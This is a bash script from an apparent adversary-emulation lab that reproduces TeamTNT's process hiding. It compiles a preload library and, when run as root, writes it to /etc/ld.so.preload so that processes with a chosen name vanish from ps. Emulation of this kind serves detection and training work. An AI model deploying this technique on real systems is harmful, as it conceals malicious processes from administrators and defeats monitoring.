#!/usr/bin/env bash
# T1574.006 / T1014 / T1049 — userspace process hiding via ld.so.preload
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
require_lab

LIB_DIR="${SCRIPT_DIR}/../lib"
PRELOAD_SRC="${LIB_DIR}/libprocesshider-demo.c"
PRELOAD_SO="${EVASION_STAGING}/libprocesshider.so"
HIDE_NAME="${MOCK_MINER_NAME}"

log "Building demo preload library (Hildegard/TeamTNT T1574.006)"
if ! command -v gcc >/dev/null 2>&1; then
  warn "gcc not found — showing preload source only"
  cat "${PRELOAD_SRC}"
  exit 0
fi

gcc -shared -fPIC -o "${PRELOAD_SO}" "${PRELOAD_SRC}" -ldl
log "Built ${PRELOAD_SO}"

log "Installing preload (requires root in real scenario)"
if [[ "$(id -u)" -eq 0 ]]; then
  echo "${PRELOAD_SO}" > /etc/ld.so.preload
  export HIDE_PROCESS_NAME="${HIDE_NAME}"
  log "ld.so.preload configured — processes matching '${HIDE_NAME}' hidden from ps"
  ps aux | head -5
else
  log "Dry-run: would write '${PRELOAD_SO}' to /etc/ld.so.preload"
  log "Run with sudo for live demo: sudo HIDE_PROCESS_NAME=${HIDE_NAME} $0"
  LD_PRELOAD="${PRELOAD_SO}" HIDE_PROCESS_NAME="${HIDE_NAME}" ps aux | head -5 || true
fi

log "Note: real TeamTNT also uses kernel rootkits (T1014 / Diamorphine) — see diagrams/ for Ring0 content"
